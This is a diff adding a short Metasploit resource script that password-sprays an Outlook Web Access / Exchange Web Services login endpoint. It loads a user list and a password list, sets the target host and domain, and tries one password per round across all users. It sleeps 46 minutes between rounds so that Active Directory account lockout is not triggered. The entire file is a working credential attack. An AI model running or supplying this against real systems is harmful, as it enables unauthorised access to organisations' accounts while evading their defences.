@@ -1,0 +1,16 @@
+<ruby>
+run_single("spool ewsbrute-loop.txt")
+run_single("use auxiliary/scanner/http/owa_ews_login")
+run_single("set RHOSTS $TARGET")
+run_single("set RPORT 443")
+run_single("set AD_DOMAIN $DOMAIN")
+run_single("set USER_FILE flast.txt")
+run_single("set verbose true")
+File.open("passwords.txt", "r") do |file_handle|
+  file_handle.each_line do |pass|
+    run_single(%Q[set PASSWORD #{pass}])
+    run_single("exploit")
+    sleep 2760 #Sleep for 46 minutes to make AD happy
+  end
+end
+</ruby>
